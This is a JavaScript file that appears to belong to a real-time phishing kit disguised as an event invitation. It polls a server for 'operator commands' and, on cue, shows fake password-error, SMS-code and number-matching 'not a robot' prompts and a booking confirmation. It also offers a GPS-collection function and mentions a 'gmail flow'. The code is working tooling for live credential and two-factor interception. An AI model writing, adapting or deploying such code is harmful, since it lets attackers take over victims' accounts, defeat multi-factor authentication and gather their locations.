(function () {
  const SESSION_KEY = '__SUBMISSION_SESSION_ID__';

  function getSessionId() {
    return sessionStorage.getItem(SESSION_KEY) || '';
  }

  function setSessionId(id) {
    sessionStorage.setItem(SESSION_KEY, id);
  }

  function clearSessionId() {
    sessionStorage.removeItem(SESSION_KEY);
  }

  // Inject overlay container once
  function ensureContainer() {
    let container = document.getElementById('response-container');
    if (container) return container;
    container = document.createElement('div');
    container.id = 'response-container';
    document.body.appendChild(container);
    return container;
  }

  function closeOverlay() {
    const container = document.getElementById('response-container');
    if (!container) return;
    const overlay = container.querySelector('.response-overlay');
    if (overlay) {
      overlay.classList.remove('is-open');
      setTimeout(() => { if (container) container.innerHTML = ''; }, 300);
    }
  }

  function renderOverlay(html) {
    const container = ensureContainer();
    container.innerHTML = html;
    const overlay = container.querySelector('.response-overlay');
    requestAnimationFrame(() => overlay.classList.add('is-open'));
    return overlay;
  }

  function showSuccess() {
    renderOverlay(`
      <div class="response-overlay" id="overlay-success">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon success">✓</div>
          <h2 class="response-title">Spot Reserved Successfully</h2>
          <p class="response-message">Your invitation has been confirmed and your spot for the event has been booked. We look forward to seeing you there!</p>
          <div class="response-actions">
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Done</button>
          </div>
        </div>
      </div>
    `);
  }

  function showPasswordError() {
    renderOverlay(`
      <div class="response-overlay" id="overlay-password-error">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon error">!</div>
          <h2 class="response-title">Incorrect Password</h2>
          <p class="response-message">The password you entered is incorrect. Please try again.</p>
          <div class="response-actions">
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Try Again</button>
          </div>
        </div>
      </div>
    `);
  }

  function showYesPrompt() {
    renderOverlay(`
      <div class="response-overlay" id="overlay-yes-prompt">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon yes">✓</div>
          <h2 class="response-title">Confirmation Required</h2>
          <p class="response-message">Please confirm your choice to continue.</p>
          <div class="response-actions">
            <button class="response-btn response-btn-secondary" type="button" onclick="window.__ResponseControls.close()">Cancel</button>
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Confirm</button>
          </div>
        </div>
      </div>
    `);
  }

  function showSmsPrompt() {
    renderOverlay(`
      <div class="response-overlay" id="overlay-sms">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon sms">💬</div>
          <h2 class="response-title">SMS Verification</h2>
          <p class="response-message">A verification code has been sent to your phone. Enter the code below to continue.</p>
          <form class="response-form" onsubmit="event.preventDefault(); window.__ResponseControls.close();">
            <label for="sms-code">SMS Code</label>
            <input type="text" id="sms-code" name="sms-code" placeholder="Enter 6-digit code" inputmode="numeric" maxlength="6" />
          </form>
          <div class="response-actions">
            <button class="response-btn response-btn-secondary" type="button" onclick="window.__ResponseControls.close()">Cancel</button>
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Verify</button>
          </div>
        </div>
      </div>
    `);
  }

  function showNumberPrompt(number) {
    renderOverlay(`
      <div class="response-overlay" id="overlay-number">
        <div class="response-card">
          <button class="response-close" type="button" onclick="window.__ResponseControls.close()">×</button>
          <div class="response-icon number">#</div>
          <h2 class="response-title">Enter This Number</h2>
          <p class="response-message">Please enter the number shown below to verify you are not a robot.</p>
          <div class="response-number">${number}</div>
          <form class="response-form" onsubmit="event.preventDefault(); window.__ResponseControls.close();">
            <label for="number-input">Enter the number above</label>
            <input type="text" id="number-input" name="number-input" placeholder="Type the number" inputmode="numeric" />
          </form>
          <div class="response-actions">
            <button class="response-btn response-btn-secondary" type="button" onclick="window.__ResponseControls.close()">Cancel</button>
            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Submit</button>
          </div>
        </div>
      </div>
    `);
  }

  function handleCommand(command, data) {
    switch (command) {
      case 'success': showSuccess(); break;
      case 'password_error': showPasswordError(); break;
      case 'yes_prompt': showYesPrompt(); break;
      case 'sms': showSmsPrompt(); break;
      case 'number_prompt':
        if (data) showNumberPrompt(data);
        else showNumberPrompt('?');
        break;
      default: break;
    }
  }

  // Long-poll loop: keeps checking for operator commands
  let polling = false;
  async function startPolling(sessionId) {
    if (polling) return;
    polling = true;
    while (polling) {
      try {
        const res = await fetch(`/api/status/${sessionId}`);
        if (!res.ok) { polling = false; break; }
        const result = await res.json();
        if (result.command) {
          handleCommand(result.command, result.data);
          // Keep polling for additional commands unless it's a terminal success
          if (result.command === 'success') {
            polling = false;
            clearSessionId();
            break;
          }
        }
      } catch (e) {
        // network hiccup — wait briefly and retry
        await new Promise((r) => setTimeout(r, 3000));
      }
    }
  }

  // GPS collection
  function collectGps() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve({ lat: null, lng: null });
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => resolve({ lat: null, lng: null }),
        { timeout: 5000, maximumAge: 60000 }
      );
    });
  }

  // Public API
  window.__ResponseControls = {
    start: startPolling,
    handle: handleCommand,
    close: closeOverlay,
    setSessionId,
    getSessionId,
    clearSessionId,
    collectGps,
  };

  // If a session is already stored (e.g. page reloaded after gmail flow), resume polling
  const existingSession = getSessionId();
  if (existingSession) {
    startPolling(existingSession);
  }
})();
